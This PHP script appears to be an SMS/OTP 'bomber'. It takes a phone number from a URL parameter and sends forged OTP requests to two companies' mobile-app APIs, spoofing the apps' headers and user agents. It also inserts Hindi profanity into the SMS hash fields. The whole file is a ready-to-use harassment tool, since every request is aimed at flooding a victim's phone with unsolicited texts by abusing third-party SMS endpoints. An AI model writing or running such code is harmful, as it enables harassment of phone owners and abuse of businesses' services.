<?php
$mobile = $_GET['number'];
// API Endpoint
$url = 'https://thekrishi.com/v2/otp/get?lang=en&ver=293&android_id=e2f60ac410d5bf6f';

// Request data
$data = "--3b16a0bf-e90f-4d10-afa7-967e604040e3\r\n";
$data .= "Content-Disposition: form-data; name=\"name\"\r\n";
$data .= "Content-Transfer-Encoding: binary\r\n";
$data .= "Content-Type: text/plain; charset=UTF-8\r\n";
$data .= "Content-Length: 5\r\n\r\n";
$data .= "David\r\n";
$data .= "--3b16a0bf-e90f-4d10-afa7-967e604040e3\r\n";
$data .= "Content-Disposition: form-data; name=\"country_code\"\r\n";
$data .= "Content-Transfer-Encoding: binary\r\n";
$data .= "Content-Type: text/plain; charset=UTF-8\r\n";
$data .= "Content-Length: 2\r\n\r\n";
$data .= "91\r\n";
$data .= "--3b16a0bf-e90f-4d10-afa7-967e604040e3\r\n";
$data .= "Content-Disposition: form-data; name=\"phone_no\"\r\n";
$data .= "Content-Transfer-Encoding: binary\r\n";
$data .= "Content-Type: text/plain; charset=UTF-8\r\n";
$data .= "Content-Length: 10\r\n\r\n";
$data .= "$mobile\r\n";
$data .= "--3b16a0bf-e90f-4d10-afa7-967e604040e3\r\n";
$data .= "Content-Disposition: form-data; name=\"source\"\r\n";
$data .= "Content-Transfer-Encoding: binary\r\n";
$data .= "Content-Type: text/plain; charset=UTF-8\r\n";
$data .= "Content-Length: 7\r\n\r\n";
$data .= "android\r\n";
$data .= "--3b16a0bf-e90f-4d10-afa7-967e604040e3\r\n";
$data .= "Content-Disposition: form-data; name=\"count\"\r\n";
$data .= "Content-Transfer-Encoding: binary\r\n";
$data .= "Content-Type: text/plain; charset=UTF-8\r\n";
$data .= "Content-Length: 1\r\n\r\n";
$data .= "1\r\n";
$data .= "--3b16a0bf-e90f-4d10-afa7-967e604040e3\r\n";
$data .= "Content-Disposition: form-data; name=\"sms_hash\"\r\n";
$data .= "Content-Transfer-Encoding: binary\r\n";
$data .= "Content-Type: text/plain; charset=UTF-8\r\n";
$data .= "Content-Length: 11\r\n\r\n";
$data .= "matherchod kutte ke baap\r\n";
$data .= "--3b16a0bf-e90f-4d10-afa7-967e604040e3--";

// Headers
$headers = array(
    'Host: thekrishi.com',
    'Accept: application/json;charset=UTF-8',
    'Content-Type: multipart/form-data; boundary=3b16a0bf-e90f-4d10-afa7-967e604040e3',
    'Connection: Keep-Alive',
    'Accept-Encoding: gzip',
    'User-Agent: okhttp/4.9.0'
);

// Initialize cURL session
$ch = curl_init($url);

// Set cURL options
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");

// Execute cURL session and store the response
$response = curl_exec($ch);

// Check for cURL errors
if (curl_errno($ch)) {
    echo 'Curl error: ' . curl_error($ch);
}

// Close cURL session
curl_close($ch);

// Print the response
echo "Response: " . $response;

// API Endpoint
$url1 = 'https://apis.bisleri.com/send-otp';

// Request data
$data1 = array(
    "email" => "dj11@gmail.com",
    "mobile" => "$mobile",
    "source" => "app",
    "smsHash" => "Matherchod Randi ke bacche",
    "referral_code" => "",
    "os" => "Android"
);

// Convert data to JSON format
$json_data = json_encode($data1);

// Headers
$headers1 = array(
    'Host: apis.bisleri.com',
    'content-length: ' . strlen($json_data),
    'accept: application/json, text/plain, */*',
    'x-requested-with: 7Yhm6b86qTsrpcMWtUixPLnv02nHf3wFf5vkukwu',
    'authorization: Bearer null',
    'user-agent: Mozilla/5.0 (Linux; Android 13; Redmi Note 7 Pro Build/TQ3A.230605.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36',
    'content-type: application/json',
    'origin: http://localhost',
    'sec-fetch-site: cross-site',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: http://localhost/',
    'accept-encoding: gzip, deflate',
    'accept-language: en-US,en;q=0.9'
);

// Initialize cURL session
$ch = curl_init($url1);

// Set cURL options
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers1);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");

// Execute cURL session and store the response
$response = curl_exec($ch);

// Check for cURL errors
if (curl_errno($ch)) {
    echo 'Curl error: ' . curl_error($ch);
}

// Close cURL session
curl_close($ch);

// Print the response
echo "Response: " . $response;
?>

